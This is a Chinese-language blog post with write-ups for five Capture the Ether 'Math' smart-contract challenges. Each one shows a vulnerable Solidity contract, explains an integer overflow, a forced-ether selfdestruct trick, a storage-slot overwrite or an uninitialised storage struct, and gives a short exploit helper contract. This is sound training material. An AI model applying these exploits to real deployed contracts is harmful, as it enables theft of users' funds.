<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CaptureTheEther_Math_题解 | 0xOne1eaF's Blog Post</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>CaptureTheEther_Math_题解</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2025-03-18T16:00:00.000Z" id="date"> 2025-03-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-04-05T02:30:44.296Z" id="updated"> 2025-04-05</time></div></span></div></div><hr><div id="post-content"><h1 id="Capture-the-ether靶场解题记录"><a href="#Capture-the-ether靶场解题记录" class="headerlink" title="Capture the ether靶场解题记录"></a>Capture the ether靶场解题记录</h1><h1 id="Math"><a href="#Math" class="headerlink" title="-Math"></a>-Math</h1><h3 id="1-Token-sale"><a href="#1-Token-sale" class="headerlink" title="1.Token sale"></a>1.Token sale</h3><p>通关条件是让合约中的余额小于1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line"></span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);//!整数溢出 如果用户传入一个非常大的 numTokens 值，使得 numTokens * PRICE_PER_TOKEN 发生溢出，msg.value 的检查可能会通过，从而导致用户以较少的以太币购买大量代币。</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line"></span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然要求的是无中生有，那就先从溢出的角度看。代码中的 1 ether 具有一定的迷惑性，如果将 1 ether 视为 1，则代码没问题。但是合约中 ETH 的数量单位其实是 wei，1 ether &#x3D; 10**18 wei，这么看来 buy 函数中的 numTokens <em>PRICE_PER_TOKEN 就很有问题了。我们只需要选择一个数让 numTokens</em> PRICE_PER_TOKEN 溢出，就能够获得超量代币。</p>
<p>攻击合约就没什么好说的，主要是计算能达到溢出的numTokens，和需要购买的wei的value</p>
<p>攻击合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">//要我们把合约的代币清空？我们很容易发现buy中的整数溢出漏洞。因为虽然合约里eth的单位是ether，但是他的存储还是以wei为单位。1 ether=10^18.如果我们传入一个较大的numTokens，产生溢出得到一个很小的value。</span><br><span class="line">contract figure&#123;</span><br><span class="line">    uint256 public max2;</span><br><span class="line">    uint256 public max10;</span><br><span class="line">    uint256 public numToken;</span><br><span class="line">    uint256 public value;</span><br><span class="line">    function fi()public &#123;</span><br><span class="line">        max2=2**256-1;</span><br><span class="line">        max10=10**18;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function f2()public&#123;</span><br><span class="line">        numToken=max2/max10 +1/max10+1;</span><br><span class="line">        value=numToken*10**18;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后得到如下的数据</p>
<p class='item-img' data-src='https://i.ibb.co/XZTMqfzC/image-20250319165121464.png'><img src="https://i.ibb.co/XZTMqfzC/image-20250319165121464.png" alt="img"></p>
<p>接下来给buy传入一个会造成溢出的numTokens 并且上方部署消耗wei的数量为415992086870360064</p>
<p class='item-img' data-src='https://i.ibb.co/9S20NNx/image-20250319165248894.png'><img src="https://i.ibb.co/9S20NNx/image-20250319165248894.png" alt="img"></p>
<p>然后我们就获得了一堆代币，这个时候再卖出1eth就能达成挑战</p>
<h3 id="2-Token-whale"><a href="#2-Token-whale" class="headerlink" title="2.Token whale"></a>2.Token whale</h3><p>通关条件是获得超过 1000000 个 token</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21; </span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line"></span><br><span class="line">    address player;</span><br><span class="line">    // 存储玩家地址的变量。</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    // 代币的总供应量，公开可见。</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    // 一个映射，记录每个地址的代币余额，公开可见。</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line">    // 一个嵌套映射，记录某个地址授权给另一个地址的代币数量，公开可见。</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    // 代币的名称，公开可见。</span><br><span class="line"></span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    // 代币的符号，公开可见。</span><br><span class="line"></span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line">    // 代币的小数位数，通常为 18，公开可见。</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        // 构造函数，初始化合约时调用。</span><br><span class="line">        player = _player;</span><br><span class="line">        // 设置玩家地址。</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        // 设置代币的总供应量为 1000。</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">        // 将所有代币分配给玩家。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        // 检查挑战是否完成。</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">        // 如果玩家的代币余额大于或等于 100 万，则返回 true。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">    // 定义一个事件，用于记录代币的转账操作。</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        // 内部函数，用于执行代币转账。</span><br><span class="line">        balanceOf[msg.sender] -= value;</span><br><span class="line">        // 从调用者的余额中扣除转账金额。</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line">        // 将转账金额添加到接收者的余额中。</span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">        // 触发 Transfer 事件。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        // 公共函数，允许用户转账代币。</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        // 确保调用者的余额足够。</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        // 确保接收者的余额不会溢出。</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">        // 调用内部的 _transfer 函数执行转账。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line">    // 定义一个事件，用于记录代币的授权操作。</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        // 公共函数，允许用户授权其他地址使用自己的代币。</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        // 设置授权金额。</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">        // 触发 Approval 事件。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        // 公共函数，允许用户从另一个地址转移代币（需要授权）。</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        // 确保转出地址的余额足够。</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        // 确保接收者的余额不会溢出。</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line">        // 确保调用者有足够的授权额度。</span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        // 减少调用者的授权额度。</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">        // 调用内部的 _transfer 函数执行转账。</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>看到这个大额数字我第一时间就想到了溢出，我们注意到 <code>transferFrom</code> 调用了 <em><code>transfer</code>，而</em> <code>transfer</code> 扣除的是 <code>msg.sender</code> 的余额，这可能导致溢出。原因在于，在调用 <code>transferFrom</code> 的时候，<code>msg.sender</code> 很可能只是一个没有持币的代理地址，也就是说 <code>msg.sender</code> 的余额可能为 0，此时被扣除一个正数就会发生溢出。</p>
<p>由合约给的条件，我们初始有1000token，先转600给B</p>
<p class='item-img' data-src='https://i.ibb.co/spjrM97H/image-20250322161723306.png'><img src="https://i.ibb.co/spjrM97H/image-20250322161723306.png" alt="image"></p>
<p>然后用B账户给我授权600</p>
<p class='item-img' data-src='https://i.ibb.co/zTrYLy4M/image-20250322161828947.png'><img src="https://i.ibb.co/zTrYLy4M/image-20250322161828947.png" alt="image"></p>
<p>我的账户执行transferFrom。（注意：因为此时value&#x3D;600,msg.sender(我）只有400，所以会发生下溢）</p>
<p class='item-img' data-src='https://i.ibb.co/TBgn6vVg/image-20250322161857865.png'><img src="https://i.ibb.co/TBgn6vVg/image-20250322161857865.png" alt="image"></p>
<p>成功获得大量token</p>
<p class='item-img' data-src='https://i.ibb.co/C34D5nZQ/image-20250322161920215.png'><img src="https://i.ibb.co/C34D5nZQ/image-20250322161920215.png" alt="image"></p>
<hr>
<h3 id="3-Retirement-fund"><a href="#3-Retirement-fund" class="headerlink" title="3.Retirement fund"></a>3.Retirement fund</h3><p>题目要求：取走合约中所有的ETH</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line"></span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&#x27;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意到从合约中取款的必要条件是 <code>startBalance - address(this).balance &gt; 0</code> ，startBalance 和合约目前的 balance 都是 1 ETH。我们只需要让合约的 balance 大于 1 ETH，<code>startBalance -   address(this).balance</code> 就会溢出从而使得条件满足。虽然合约中并没有充值函数，也没有 payable fallback 函数，但是我们可以使用 selfdestruct 强制向合约中转入 ETH。</p>
<p>所以直接写自爆合约就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract destruct&#123;</span><br><span class="line">    function kill()public payable&#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p class='item-img' data-src='https://i.ibb.co/9kWqxRYQ/image-20250322163032713.png'><img src="https://i.ibb.co/9kWqxRYQ/image-20250322163032713.png" alt="image"></p>
<p>成功</p>
<hr>
<h3 id="4-Mapping"><a href="#4-Mapping" class="headerlink" title="4.Mapping"></a>4.Mapping</h3><p>题目要求我们把isComplete条件改为true</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map; //一个动态数组，用于存储键值对。数组的索引（key）相当于键，数组的值（value）相当于值。</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    bytes32 public output;</span><br><span class="line">    uint256 public result;</span><br><span class="line">    function attack()public &#123;</span><br><span class="line">        output = keccak256(bytes32(1));</span><br><span class="line">        result = 2**256-1-uint256(output)+1;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    //动态数组的存储方式是：slot【1】存储数组的长度，数组的data存储在：keccak256(bytes(1))+x，x就是数组的下标。</span><br><span class="line">    //但是solidty一共有2^256个插槽，也就是说动态数组的存储范围覆盖了整个插槽范围，也就是说我们可以找到数组data起始位置推出slot[0]的位置，然后修改slot[0]数据。</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p class='item-img' data-src='https://i.ibb.co/nNcyj1rh/image-20250405100122016.png'><img src="https://i.ibb.co/nNcyj1rh/image-20250405100122016.png" alt="image"></p>
<p>result就是我们算出来的slot[0]的位置，带入set方法，在solidity中0为false，ture为1，value输入1</p>
<p class='item-img' data-src='https://i.ibb.co/3y8x131R/image-20250405100217304.png'><img src="https://i.ibb.co/3y8x131R/image-20250405100217304.png" alt="image"></p>
<p>完成</p>
<hr>
<h3 id="5-Donation"><a href="#5-Donation" class="headerlink" title="5.Donation"></a>5.Donation</h3><p>题目要求我们把ETH全部取走</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>问题是在于结构体的声明并没有初始化，就没有赋予存储空间，所以slot[0]是<code>Donation【】</code>，slot[1]是owner。</p>
<p>然后为结构体在函数内非显式地初始化的时候会使用storage存储而不是memory，所以就可以达到变量覆盖的效果，显然此处donate函数中初始化donation结构体的过程存在问题，我们可以覆盖solt 0和slot 1处1存储的状态变量</p>
<p>攻击合约就是计算下数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">	uint256 public res;</span><br><span class="line">	uint256 public addr;</span><br><span class="line">	function att()public&#123;</span><br><span class="line">       addr=uint256(msg.sender);</span><br><span class="line">       res=addr/(10**36);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p class='item-img' data-src='https://i.ibb.co/DPb7XPSt/image-20250405102434930.png'><img src="https://i.ibb.co/DPb7XPSt/image-20250405102434930.png" alt="image"></p>
<p>计算出来的res就是输入的value,addr就是etherAmount</p>
<p>先调用withdraw再调用donate，完成</p>
<p class='item-img' data-src='https://i.ibb.co/Jw1mzyK7/image-20250405102530659.png'><img src="https://i.ibb.co/Jw1mzyK7/image-20250405102530659.png" alt="image"></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/news/">← Next 就像冬天下雪，不算多特别</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2025/03/15/CaptureTheEther-Lotteries-1-4/">CaptureTheEther_Lotteries_题解 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/1.png" alt="Logo"></a><h1 id="Dr"><a>0xOne1eaF</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Capture-the-ether%E9%9D%B6%E5%9C%BA%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">Capture the ether靶场解题记录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Math"><span class="toc-number">2.</span> <span class="toc-text">-Math</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Token-sale"><span class="toc-number">2.0.1.</span> <span class="toc-text">1.Token 